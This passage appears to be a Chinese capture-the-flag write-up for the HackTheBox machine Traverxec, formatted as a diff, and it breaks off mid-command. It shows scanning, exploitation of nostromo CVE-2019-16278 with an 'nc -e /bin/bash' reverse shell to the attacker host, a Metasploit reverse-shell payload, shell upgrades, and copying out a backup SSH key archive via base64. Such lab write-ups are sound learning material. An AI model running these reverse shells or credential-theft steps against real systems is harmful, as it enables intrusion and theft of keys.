@@ -1,0 +1,882 @@
+I"/�<h2 id="0x00-简介">0x00 简介</h2>
+
+<ul>
+  <li>CVE-2019-16278  nostromo</li>
+  <li>爆破</li>
+  <li>gtfobin’s</li>
+</ul>
+
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
+
+<ol>
+  <li>首先使用 nmap 扫描目标靶机</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td><td class="rouge-code"><pre>root@kali:~# nmap <span class="nt">-A</span> 10.10.10.165
+Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-02 22:25 CST
+Nmap scan report <span class="k">for </span>10.10.10.165
+Host is up <span class="o">(</span>0.54s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nostromo 1.9.6
+|_http-server-header: nostromo 1.9.6
+|_http-title: TRAVERXEC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Crestron XPanel control system <span class="o">(</span>89%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>88%<span class="o">)</span>, HP P2000 G3 NAS device <span class="o">(</span>86%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>86%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>86%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>86%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>86%<span class="o">)</span>, Android 4.1.1 <span class="o">(</span>85%<span class="o">)</span>, Android 4.1.2 <span class="o">(</span>85%<span class="o">)</span>, Linux 3.10 - 4.11 <span class="o">(</span>85%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   363.39 ms 10.10.14.1
+2   363.49 ms 10.10.10.165
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>461.24 seconds
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>nmap -A (进攻性扫描模式选项)</p>
+
+  <p>这个选项启用额外的高级和高强度选项，目前还未完全确定具体的内容。目前，这个选项集成了操作系统检测(-O) 和版本扫描(-sV)，以后会增加更多的功能。 目的是启用一个全面的扫描选项集合，而不需要用户记忆大量的选项。这个选项仅仅启用功能，不包含用于可能所需要的 时间选项(如-T4)或细节选项(-v)。</p>
+</blockquote>
+
+<p>目标靶机开放了 22 和 80 端口，注意到其中 80 端口使用了 <strong>nostromo 1.9.6</strong> 服务</p>
+
+<ol>
+  <li>访问 web 服务查看是否存在有用信息</li>
+</ol>
+
+<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gailmzeunpj31qk0u04ju.jpg" alt="image-20200102224439846" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>root@kali:~# dirsearch <span class="nt">-u</span> <span class="s2">"10.10.10.165"</span> <span class="nt">-e</span> <span class="k">*</span>
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+<span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions:  | Threads: 10 | Wordlist size: 6083
+
+Error Log: /root/dirsearch/logs/errors-20-01-02_22-46-54.log
+
+Target: 10.10.10.165
+
+<span class="o">[</span>22:46:58] Starting: 
+<span class="o">[</span>22:47:04] 400 -  302B  - /%2e%2e/google.com
+<span class="o">[</span>22:47:04] 501 -  310B  - /%20../
+<span class="o">[</span>22:47:10] 200 -   15KB - /
+<span class="o">[</span>22:48:05] 200 -   15KB - /%3f/
+<span class="o">[</span>22:52:37] 501 -  310B  - /admin%20/
+<span class="o">[</span>22:56:49] 301 -  314B  - /css  -&gt;  http://10.10.10.165/css/
+<span class="o">[</span>22:58:48] 301 -  314B  - /icons  -&gt;  http://10.10.10.165/icons/
+<span class="o">[</span>22:58:58] 301 -  314B  - /img  -&gt;  http://10.10.10.165/img/
+<span class="o">[</span>22:59:11] 200 -   15KB - /index.html
+<span class="o">[</span>22:59:30] 301 -  314B  - /js  -&gt;  http://10.10.10.165/js/
+<span class="o">[</span>22:59:44] 301 -  314B  - /lib  -&gt;  http://10.10.10.165/lib/
+<span class="o">[</span>23:01:26] 501 -  310B  - /New%20Folder
+<span class="o">[</span>23:01:26] 501 -  310B  - /New%20folder%20%282%29
+<span class="o">[</span>23:03:34] 200 -  203B  - /Readme.txt
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>查看源码、扫描目录后均未发现特别有意义的信息，倒是知道了网站的所有者叫 David</p>
+
+<h2 id="0x02-getshell">0x02 Getshell</h2>
+
+<p>nostromo nhttpd 存在版本漏洞，可以远程执行命令，这里可以有两种办法 getshell</p>
+
+<h3 id="方法一手工利用">方法一：手工利用</h3>
+
+<p>下载公开 exploits，<a href="https://github.com/jas502n/CVE-2019-16278">CVE-2019-16278</a></p>
+
+<p>利用方式：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>./CVE-2019-16278.sh <span class="s1">'ip'</span> <span class="s1">'port'</span> <span class="s1">'cmd'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>在本机监听 4444 端口，利用 exp 反弹 bash 回 kali 攻击机，获得靶机 shell</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>root@kali:~/CVE/CVE-2019-16278# ./CVE-2019-16278.sh 10.10.10.165 80 nc <span class="nt">-e</span> /bin/bash 10.10.15.44 4444
+
+root@kali:~/CVE/CVE-2019-16278# nc <span class="nt">-lvnp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.15.44] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165] 54462
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>此时获取的并不是一个具有完整功能的 bash，为了获取一个交互式的 tty 我们可以利用以下命令（第一个成功率最高）：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="mf">1.</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/sh")'</span>
+<span class="mf">2.</span> <span class="n">echo</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
+<span class="mf">3.</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><strong>Tips:</strong> 之后为了得到一个更好的用的 shell 可以按 <strong>Ctrl + z</strong> 挂起任务，之后输入 <strong>stty raw -echo</strong> .  然后输入 <strong>fg</strong> 将任务回到前台，这样我们就可以在 shell 中使用上下键回到上一条命令并利用 tab 补全命令。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span><span class="p">;</span>
+www-data@traverxec:/usr/bin<span class="nv">$ </span>^Z
+<span class="o">[</span>1]+  已停止               nc <span class="nt">-lvnp</span> 4444
+root@kali:~/CVE/CVE-2019-16278# <span class="nb">stty </span>raw <span class="nt">-echo</span> 
+root@kali:~/CVE/CVE-2019-16278# nc <span class="nt">-lvnp</span> 4444
+                                             <span class="nb">pwd</span>
+/usr/bin
+www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>反弹 shell 的一些技术文章</p>
+
+  <p><a href="https://xz.aliyun.com/t/2548">Linux反弹shell（一）文件描述符与重定向</a></p>
+
+  <p><a href="https://xz.aliyun.com/t/2549#toc-5">Linux 反弹shell（二）反弹shell的本质</a></p>
+
+  <p><a href="https://www.anquanke.com/post/id/87017">linux各种一句话反弹shell总结</a></p>
+</blockquote>
+
+<h3 id="方法二msf-自动化利用">方法二：msf 自动化利用</h3>
+
+<p>更新 msf</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>apt update
+<span class="nv">$ </span>apt <span class="nb">install </span>metasploit-framework
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>搜索漏洞并利用：</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+</pre></td><td class="rouge-code"><pre>root@kali:~# msfconsole
+<span class="o">[</span>-] <span class="k">***</span>rting the Metasploit Framework console.../
+<span class="o">[</span>-] <span class="k">*</span> WARNING: No database support: could not connect to server: Connection refused
+	Is the server running on host <span class="s2">"localhost"</span> <span class="o">(</span>::1<span class="o">)</span> and accepting
+	TCP/IP connections on port 5432?
+could not connect to server: Connection refused
+	Is the server running on host <span class="s2">"localhost"</span> <span class="o">(</span>127.0.0.1<span class="o">)</span> and accepting
+	TCP/IP connections on port 5432?
+
+<span class="o">[</span>-] <span class="k">***</span>
+                                                  
+     ,           ,
+    /             <span class="se">\</span>
+   <span class="o">((</span>__---,,,---__<span class="o">))</span>
+      <span class="o">(</span>_<span class="o">)</span> O O <span class="o">(</span>_<span class="o">)</span>_________
+         <span class="se">\ </span>_ /            |<span class="se">\</span>
+          o_o <span class="se">\ </span>  M S F   | <span class="se">\</span>
+               <span class="se">\ </span>  _____  |  <span class="k">*</span>
+                <span class="o">||</span>|   WW|||
+                <span class="o">||</span>|     <span class="o">||</span>|
+
+
+       <span class="o">=[</span> metasploit v5.0.66-dev                          <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 1956 exploits - 1092 auxiliary - 336 post       <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 558 payloads - 45 encoders - 10 nops            <span class="o">]</span>
++ <span class="nt">--</span> <span class="nt">--</span><span class="o">=[</span> 7 evasion                                       <span class="o">]</span>
+
+msf5 <span class="o">&gt;</span> search nostromo
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                   Disclosure Date  Rank  Check  Description</span>
+   -  <span class="nt">----</span>                                   <span class="nt">---------------</span>  <span class="nt">----</span>  <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
+
+
+msf5 <span class="o">&gt;</span> use exploit/multi/http/nostromo_code_exec 
+msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> show options 
+
+Module options <span class="o">(</span>exploit/multi/http/nostromo_code_exec<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS                    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT    80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SRVHOST  0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0
+   SRVPORT  8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
+   SSL      <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   SSLCert                   no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
+   URIPATH                   no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span>
+
+
+msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.15.44
+LHOST <span class="o">=&gt;</span> 10.10.15.44
+msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOST 10.10.10.165
+RHOST <span class="o">=&gt;</span> 10.10.10.165
+msf5 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> <span class="o">&gt;</span> exploit 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.15.44:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command </span>payload
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.15.44:4444 -&gt; 10.10.10.165:57788<span class="o">)</span> at 2020-01-02 23:28:33 +0800
+<span class="nb">id
+
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+shell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to find binary<span class="o">(</span>python<span class="o">)</span> on target machine
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found python at /usr/bin/python
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using <span class="sb">`</span>python<span class="sb">`</span> to pop up an interactive shell
+<span class="nv">$ </span><span class="nb">pwd
+pwd</span>
+/usr/bin
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="0x03-usertxt">0x03 User.txt</h2>
+
+<p>我们以 www-data 的低权限进入了靶机</p>
+
+<p>在 /home 目录下发现疑似 user 的文件夹，但没有权限读取其目录</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>www-data@traverxec:/usr/bin<span class="nv">$ </span><span class="nb">cd</span> /home
+www-data@traverxec:/home<span class="nv">$ </span><span class="nb">ls
+</span>david
+www-data@traverxec:/home<span class="nv">$ </span><span class="nb">cd </span>david
+www-data@traverxec:/home/david<span class="nv">$ </span><span class="nb">ls
+ls</span>: cannot open directory <span class="s1">'.'</span>: Permission denied
+www-data@traverxec:/home/david<span class="nv">$ </span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>这时候可以去找配置文件和证书文件等，我们在 <strong>/var/nostromo/conf</strong> 目录下发现了 nostromo 的配置文件</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre></td><td class="rouge-code"><pre>www-data@traverxec:/home/david<span class="nv">$ </span><span class="nb">cd</span> /var/nostromo/conf/
+www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">ls
+</span>mimes  nhttpd.conf
+www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">cat </span>nhttpd.conf 
+<span class="c"># MAIN [MANDATORY]</span>
+
+servername		traverxec.htb
+serverlisten		<span class="k">*</span>
+serveradmin		david@traverxec.htb
+serverroot		/var/nostromo
+servermimes		conf/mimes
+docroot			/var/nostromo/htdocs
+docindex		index.html
+
+<span class="c"># LOGS [OPTIONAL]</span>
+
+logpid			logs/nhttpd.pid
+
+<span class="c"># SETUID [RECOMMENDED]</span>
+
+user			www-data
+
+<span class="c"># BASIC AUTHENTICATION [OPTIONAL]</span>
+
+htaccess		.htaccess
+htpasswd		/var/nostromo/conf/.htpasswd
+
+<span class="c"># ALIASES [OPTIONAL]</span>
+
+/icons			/var/nostromo/icons
+
+<span class="c"># HOMEDIRS [OPTIONAL]</span>
+
+homedirs		/home
+homedirs_public		public_www
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>发现在 /home 目录下存在 public_www 的文件夹，但之前查看 /home 的目录时没有找到，猜想 public_www 存在 david 文件下，尝试 cd 进去</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>www-data@traverxec:/var/nostromo/conf<span class="nv">$ </span><span class="nb">cd</span> /home/david/public_www
+www-data@traverxec:/home/david/public_www<span class="nv">$ </span><span class="nb">ls
+</span>index.html  protected-file-area
+www-data@traverxec:/home/david/public_www<span class="nv">$ </span><span class="nb">cd </span>protected-file-area/
+www-data@traverxec:/home/david/public_www/protected-file-area<span class="nv">$ </span><span class="nb">ls </span>backup-ssh-identity-files.tgz
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>其中有 ssh 密钥的备份文件压缩包 backup-ssh-identity-files.tgz, 可以通过 base64 将其拷贝到本地 kali</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">base64 </span>backup-ssh-identity-files.tgz                       
+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<span class="o">==</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>之后用 <code class="highlighter-rouge">base64 -d</code> 在本地还原 .tgz</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td><td class="rouge-code"><pre>root@kali:~# <span class="nb">echo</span> <span class="s2">"H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O+Y8AYAzcROwabff/1425pNJpWMtFInWRm4uem
+&gt; gKJ0UL311jlF2T4zMI2Wewr+OI4l+Ol3AHpBQtCXFibxf2n/wScYxXGMIGCURD5BMELCyKcP/Pf4
+&gt; mG+ZxykaPj4+fZ2Df/Peb/X/j1J+o380T2U73I8s/bnO9vG7xPgiMIFhv6o/AePf6E9AxEt/6LtE
+&gt; /w3+4vq/NP88jNEH84JFzSPi4D1BhC+3PGMz7JfHjM2N/jAadgJdSVjy/NeVew4UGQkXbu02dzPh
+&gt; 6hzE7jwt5h64paBUQcd5I85rZXhHBnNuFCo8CTsocnTcPbm7OkUttG1KrEJIcpKJHkYjRhzchYAl
+&gt; 5rjjTeZjeoUIYKeUKaqyYuAo9kqTHEEYZ/Tq9ZuWNNLALUFTqotmrGRzcRQw8V1LZoRmvUIn84Yc
+&gt; rKakVOI4+iaJu4HRXcWH1sh4hfTIU5ZHKWjxIjo1BhV0YXTh3TCUWr5IerpwJh5mCVNtdTlybjJ2
+&gt; r53ZXvRbVaPNjecjp1oJY3s6k15TJWQY5Em5s0HyGrHE9tFJuIG3BiQuZbTa2WSSsJaEWHX1NhN9
+&gt; noI66mX+4+ua+ts0REs2bFkC/An6f+v/e/rzazl83xhfPf7r+z+KYsQ//Y/iL/9jMIS//f9H8PkL
+&gt; rCAp5odzYT4sR/EYV/jQhOBrD2ANbfLZ3bvspw/sB8HknMByBR7gBe2z0uTtTx+McPkMI9RnjuV+
+&gt; wEhSEESRZXBCpHmEQnkUo1/68jgPURwmAsCY7ZkM5pkE0+7jGhnpIocaiPT5TnXrmg70WJD4hpVW
+&gt; p6pUEM3lrR04E9Mt1TutOScB03xnrTzcT6FVP/T63GRKUbTDrNeedMNqjMDhbs3qsKlGl1IMA62a
+&gt; VDcvTl1tnOujN0A7brQnWnN1scNGNmi1bAmVOlO6ezxOIyFVViduVYswA9JYa9XmqZ1VFpudydpf
+&gt; efEKOOq1S0Zm6mQm9iNVoXVx9ymltKl8cM9nfWaN53wR1vKgNa9akfqus/quXU7j1aVBjwRk2ZNv
+&gt; GBmAgicWg+BrM3S2qEGcgqtun8iabPKYzGWl0FSQsIMwI+gBYnzhPC0YdigJEMBnQxp2u8M575gS
